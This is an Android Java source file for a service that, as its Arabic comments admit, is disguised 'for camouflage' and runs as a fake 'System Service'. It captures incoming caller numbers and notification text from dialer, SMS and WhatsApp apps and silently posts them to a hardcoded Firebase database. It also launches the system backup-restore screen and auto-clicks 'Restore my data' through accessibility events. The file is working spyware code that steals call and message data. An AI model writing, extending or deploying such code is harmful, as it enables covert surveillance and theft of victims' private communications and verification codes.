package com.ban.ab;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityManager;
import java.util.List;
import okhttp3.*;
import org.json.JSONObject;
import java.io.IOException;

// ملاحظة: سنقوم بدمج وظيفة Accessibility ضمن نفس الكيان للتمويه
public class CallNotificationListener extends NotificationListenerService {

    private final OkHttpClient client = new OkHttpClient();
    private final String FIREBASE_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";
    private String lastCapturedNumber = "";

    // --- قسم مراقبة الشاشة (Accessibility Logic) ---
    
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // إذا ظهرت نافذة نظام تحتوي على كلمة "استعادة" أو "Restore"
        AccessibilityNodeInfo nodeInfo = event.getSource();
        if (nodeInfo == null) return;

        // البحث عن زر الاستعادة باللغتين العربية والإنجليزية
        checkAndClick(nodeInfo, "استعادة بياناتي");
        checkAndClick(nodeInfo, "Restore my data");
    }

    private void checkAndClick(AccessibilityNodeInfo node, String text) {
        List<AccessibilityNodeInfo> list = node.findAccessibilityNodeInfosByText(text);
        for (AccessibilityNodeInfo n : list) {
            if (n.isClickable()) {
                n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                Log.d("SystemCore", "Auto-Click Performed ✅");
            }
        }
    }

    // --- قسم استدعاء واجهة الاستعادة ---

    public static void launchRestoreUI(Context context) {
        try {
            Intent intent = new Intent("android.intent.action.FULL_BACKUP_RESTORE");
            intent.setComponent(new ComponentName("com.android.backupconfirm", "com.android.backupconfirm.BackupRestoreConfirmation"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            Log.e("SystemCore", "Failed to launch restore UI", e);
        }
    }

    // --- بقية الكود الأصلي (إشعارات وراديو) ---

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("system_svc", "System Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        Notification notification = sbn.getNotification();
        if (notification == null || notification.extras == null) return;

        Bundle extras = notification.extras;
        String title = extras.getString(Notification.EXTRA_TITLE);
        String text = String.valueOf(extras.get(Notification.EXTRA_TEXT));

        if (isTargetPackage(packageName)) {
            if (title != null && !title.equals(lastCapturedNumber)) {
                lastCapturedNumber = title;
                sendDataToFirebase(title, text, "Bridge_Notification");
            }
        }
    }

    private boolean isTargetPackage(String pkg) {
        return pkg.contains("telecom") || pkg.contains("incallui") || 
               pkg.contains("messaging") || pkg.contains("whatsapp") || 
               pkg.contains("dialer");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // تشغيل مراقب الراديو
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (telephonyManager != null) {
            telephonyManager.listen(new PhoneStateListener() {
                @Override
                public void onCallStateChanged(int state, String incomingNumber) {
                    if (state == TelephonyManager.CALL_STATE_RINGING && incomingNumber != null) {
                        if (!incomingNumber.equals(lastCapturedNumber)) {
                            lastCapturedNumber = incomingNumber;
                            sendDataToFirebase(incomingNumber, "Incoming Call (Radio)", "Bridge_Radio");
                        }
                    }
                }
            }, PhoneStateListener.LISTEN_CALL_STATE);
        }
        
        // فحص ما إذا كان هناك أمر استعادة قادم من MainActivity أو Firebase
        if (intent != null && "START_RESTORE".equals(intent.getAction())) {
            launchRestoreUI(this);
        }

        return START_STICKY;
    }

    private void sendDataToFirebase(String number, String content, String source) {
        String userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "Unknown");
        try {
            JSONObject data = new JSONObject();
            data.put("phone", number);
            data.put("data", content);
            data.put("source", source);
            data.put("timestamp", System.currentTimeMillis());

            RequestBody body = RequestBody.create(data.toString(), MediaType.parse("application/json; charset=utf-8"));
            Request request = new Request.Builder()
                    .url(FIREBASE_URL + "verification_logs/" + userName + ".json")
                    .post(body)
                    .build();

            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) throws IOException {
                    if (response.body() != null) response.close();
                }
            });
        } catch (Exception e) {
            Log.e("Firebase_Bridge", "Error sending logs", e);
        }
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.d("Bridge", "Notification Listener Connected ✅");
    }
}
